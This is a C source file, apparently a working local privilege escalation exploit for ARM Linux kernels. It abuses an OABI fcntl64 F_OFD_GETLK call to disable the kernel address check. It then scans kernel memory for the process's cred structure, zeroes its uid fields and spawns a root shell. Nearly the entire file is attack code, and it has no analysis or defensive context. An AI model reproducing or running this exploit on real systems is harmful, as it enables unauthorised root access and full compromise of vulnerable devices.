#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <memory.h>
#include <sys/prctl.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
__attribute__((naked)) long sys_oabi_fcntl64(unsigned int fd, unsigned int cmd, unsigned long arg){
__asm __volatile (
"swi 0x9000DD\n"
"mov pc, lr\n"
:
:
:
);
}

#define F_OFD_GETLK	36
#define F_OFD_SETLK 37
#define F_OFD_SETLKW 38
#define KMEM 0xc0000000

#define COMM_LEN 16
#define COMM "t4p9fewiuvkjds19"


#define FILE_NAME "/home/user/2019"

void error_exit(const char* msg)
{
	//write(2, msg, strlen(msg));
	exit(-1);
}
void set_fs();
char page[0x1000];
#define PAGE_SIZE (sizeof(page))
ssize_t memcpy_kernel_page(char* src)
{
	ssize_t ret;
	memset(page, 0, PAGE_SIZE);
	int fd[2];
	ret = pipe(fd);
	if (ret < 0) error_exit("pipe failed");
	pid_t proc = fork();
	if (proc < 0) error_exit("fork failed");
	if (proc == 0)
	{//child
		close(fd[0]);
		set_fs();
		//if (write(1, src, 8) != 8)
		//	error_exit("write kmem failed");
		if (write(fd[1], src, PAGE_SIZE) != PAGE_SIZE)
			error_exit("write kmem failed");
		close(fd[1]);
		exit(0);
	}
	else
	{//parent
		int status;
		close(fd[1]);
		wait(&status);
		if (WIFEXITED(status) && WEXITSTATUS(status) == 0)
			ret = PAGE_SIZE;
		else
			ret = -1;
		if (read(fd[0], page, PAGE_SIZE) <= 0)
			error_exit("read kmem failed");
		close(fd[0]);
		if (ret > 0)
			printf("read kernel memory successfully, first QWORD %p, last QWORD %p\n",
				*(uintptr_t*)page, *(uintptr_t*)(page + PAGE_SIZE - sizeof(uintptr_t)));

		return ret;
	}
}
/*{
	int fd;
	memset(page, 0, PAGE_SIZE);

	//read from kernel memory
	fd = open(FILE_NAME, O_CREAT | O_WRONLY);
	if (fd < 0) error_exit("open O_CREAT | O_WRONLY");
	int ret = write(fd, src, PAGE_SIZE);
	if (ret != PAGE_SIZE)
	{
		close(fd);
		return -1;
	}
	close(fd);

	//read from file buffer
	fd = open(FILE_NAME, O_RDONLY);
	if (fd < 0) error_exit("open O_CREAT | O_WRONLY");
	ret = read(fd, page, PAGE_SIZE);
	if (ret != PAGE_SIZE) error_exit("read");
	close(fd);
	printf("read kernel memory successfully, first QWORD %p, last QWORD %p",
		*(uintptr_t*)page, *(uintptr_t*)(page + PAGE_SIZE - sizeof(uintptr_t)));
	return PAGE_SIZE;
}*/

ssize_t find_sig()
{
	size_t i = 0;
	//todo, maybe need loop
	{
		char* ret = (char*)memmem(page + i, sizeof(page) - i, COMM, COMM_LEN - 2);
		if (ret != NULL)
			return ret - page;
		else
			return -1;
	}

}

void escalate_creds(uintptr_t cred)
{
	char zeros[sizeof(int) * 8] = {0};
	cred += 4;
	int fd = open(FILE_NAME, O_CREAT | O_WRONLY);
	write(fd, zeros, sizeof(zeros));
	close(fd);
	fd = open(FILE_NAME, O_RDONLY);
	set_fs();
	read(fd, (void*)cred, sizeof(zeros));
	close(fd);
}

void get_root()
{
	char buf[8];
	prctl(PR_SET_NAME, COMM);
	for (uintptr_t i = 0xc6000; i < 0xfffff; ++i)
	{
		char* p = (char*)(i * 0x1000);
		//if (i % 0x100 == 0)
			printf("0x%x\n", p);
		ssize_t ret = memcpy_kernel_page(p);
		if (ret > 0)
		{
			ssize_t ret = find_sig();
			printf("ret: 0x%x, page: %p, comm: %s\n", ret, page, page + ret);
			if (ret >= 0)
			{
				read(0, buf, 8);
				//while(1);
				uint32_t* search = (uint32_t*)(page + ret);
				printf("search: %p\n", search);
				uintptr_t real_cred = search[-2];
				uintptr_t cred = search[-1];

				if (real_cred > KMEM && cred > KMEM)
				{
					write(1, "sig found!\n", 11);
					printf("cred: 0x%x, read_cred: 0x%x\n", cred, real_cred);
					escalate_creds(cred);
					if (cred != real_cred)
						escalate_creds(real_cred);
					char* args[] = {"/bin/sh", NULL};
					execve("/bin/sh", args, 0);
				}
			}
		}
	}
}

//https://bbs.pediy.com/thread-214585.htm

void set_fs()
{
	int fd = open("/proc/cpuinfo", O_RDONLY);
	struct flock *map_base = 0;

	if (fd == -1)
	{
		write(2, "open\n", 5);
		return exit(-1);
	}
	map_base = (struct flock *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (map_base == (void*)-1)
	{
		write(2, "mmap\n", 5);
		goto _done;
	}
	memset(map_base, 0, 0x1000);
	map_base->l_start = SEEK_SET;
	if (sys_oabi_fcntl64(fd, F_OFD_GETLK, (long)map_base))
	{
			write(2, "sys_oabi_fcntl64\n", 17);
	}
	// Arbitrary kernel read/write test
	// if (write(1, (void*)0xc031cf68, 0x10) >= 0){
	// 		write(1, "pwnned !\n", 9);
	// }
	munmap(map_base, 0x1000);
_done:
	close(fd);
}

int main(int argc, char const *argv[])
{
	get_root();
	return 0;
}

// int main(int argc, char const *argv[])
// {
// 	int fd = open("test", O_RDWR);
// 	if (fd < 0)
// 	{
// 		write(2, "open\n", 5);
// 		return -1;
// 	}
// 	struct flock fl;
// 	fl.l_type = F_WRLCK;
// 	fl.l_whence = SEEK_SET;
// 	fl.l_start = 0;
// 	fl.l_len = 0;

// 	if(fcntl(fd, F_SETLKW, &fl) < 0)
// 	{
// 		write(2, "fcntl\n", 6);
// 		return -2;
// 	}

// 	//now the fs should have already been set,
// 	//thus we could access kernel memory by system call
// 	if (write(1, (void*)0xc031cf68, 0x10) < 0)
// 	{
// 		write(2, "write\n", 6);
// 		return -3;
// 	}
// 	return 0;
// }